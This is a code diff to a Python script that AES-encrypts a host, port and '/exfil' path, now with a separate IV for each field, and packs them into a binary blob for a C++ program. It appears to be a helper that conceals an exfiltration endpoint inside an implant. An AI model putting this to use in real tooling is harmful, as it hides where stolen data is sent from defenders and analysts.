@@ -12,29 +12,32 @@ host = "127.0.0.1"
 port = "80"
 path = "/exfil"
 
-# === IV ===
-iv = get_random_bytes(16)
-
 # === ENCRYPT FUNCTION ===
-def encrypt(plaintext: str) -> bytes:
+def encrypt(plaintext: str, iv: bytes) -> bytes:
     cipher = AES.new(key, AES.MODE_CBC, iv)
     padded = pad(plaintext.encode(), AES.block_size)
     return cipher.encrypt(padded)
 
-# === ENCRYPT FIELDS ===
-enc_host = encrypt(host)
-enc_port = encrypt(port)
-enc_path = encrypt(path)
+# === ENCRYPT FIELDS WITH SEPARATE IVs ===
+iv_host = get_random_bytes(16)
+iv_port = get_random_bytes(16)
+iv_path = get_random_bytes(16)
+
+enc_host = encrypt(host, iv_host)
+enc_port = encrypt(port, iv_port)
+enc_path = encrypt(path, iv_path)
 
 # === STRUCTURE FOR C++ OUTPUT ===
-# [32 bytes key] [16 bytes IV] [1B len_host] [enc_host] [1B len_port] [enc_port] [1B len_path] [enc_path]
+# [32 bytes key]
+# [16B IV_host] [1B len_host] [enc_host]
+# [16B IV_port] [1B len_port] [enc_port]
+# [16B IV_path] [1B len_path] [enc_path]
 
 binary_blob = (
     key +
-    iv +
-    bytes([len(enc_host)]) + enc_host +
-    bytes([len(enc_port)]) + enc_port +
-    bytes([len(enc_path)]) + enc_path
+    iv_host + bytes([len(enc_host)]) + enc_host +
+    iv_port + bytes([len(enc_port)]) + enc_port +
+    iv_path + bytes([len(enc_path)]) + enc_path
 )
 
 # === WRITE TO C++ FRIENDLY FILE ===
